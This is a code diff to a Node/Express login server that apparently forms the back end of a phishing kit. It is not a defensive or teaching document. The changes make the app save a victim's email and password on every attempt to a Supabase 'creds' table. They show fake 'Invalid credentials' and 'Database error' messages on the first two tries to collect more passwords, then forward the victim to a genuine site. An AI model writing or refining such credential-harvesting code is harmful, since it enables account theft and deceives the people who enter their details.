@@ -86,11 +86,13 @@ app.get('/login', async (req, res) => {
     });
     await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
   }
-if(res.query.next){
-    res.cookie('next', res.query.next, {
+  if(req.query.next){
+    console.log("next parameter found:", req.query.next)
+    res.cookie('next', req.query.next, {
       maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
     });
   }
+
   res.render('login', {
     sessionId: sessionId,
     error: req.query.error,
@@ -117,17 +119,8 @@ app.post('/login', async (req, res) => {
       await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
     }
 
-    let { data: sessionCountData, error: countError } = await supabase
-      .from('session_count')
-      .select('count')
-      .eq('session_id', sessionId)
-      .single();
-
-    if (countError) throw countError;
-
-      await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
-      
-      return res.redirect('/login/password')
+    await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
+    return res.redirect('/login/password')
   } catch (err) {
     console.error('Error during login', err);
     return res.redirect('/login?error=Database+error');
@@ -144,6 +137,7 @@ app.get('/login/password', async (req, res) => {
     .from('creds')
     .select('email')
     .eq('session_id', sessionId)
+    .limit(1)
     .single();
 
   if (emailError) {
@@ -161,8 +155,10 @@ app.get('/login/password', async (req, res) => {
 
 
 app.post('/login/password', async (req, res) => {
-  const { password } = req.body;
-
+  const { account, password } = req.body;
+  if (!account || !account.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+    return res.redirect('/login/password?error=Invalid+email');
+  }
   try {
     let sessionId = req.cookies.sessionId;
     const isCheckedIn = await isValidSession(sessionId);
@@ -180,16 +176,23 @@ app.post('/login/password', async (req, res) => {
     let sessionCount = sessionCountData.count;
 
     if (sessionCount % 3 === 1) {
+      console.log("Login Attempt One")
       await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
+      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
       return res.redirect('/login/password?error=Invalid+credentials');
     } else if (sessionCount % 3 === 2) {
+      console.log("Login Attempt Two")
       await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
+      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
       return res.redirect('/login/password?error=Database+error')
     } else {
-      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
+      console.log("Login Attempt Three")
+      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
       await supabase.from('session_count').delete().eq('session_id', sessionId);
-   const next = req.cookies.next;
+      const next = req.cookies.next;
+      console.log("Checking for next cookie");
       if (next){
+        console.log("Next cookie found");
         const fullUrl =`${process.env.MAIN_REDIRECT_URL}/${next}`;
         return res.redirect(fullUrl);
       }
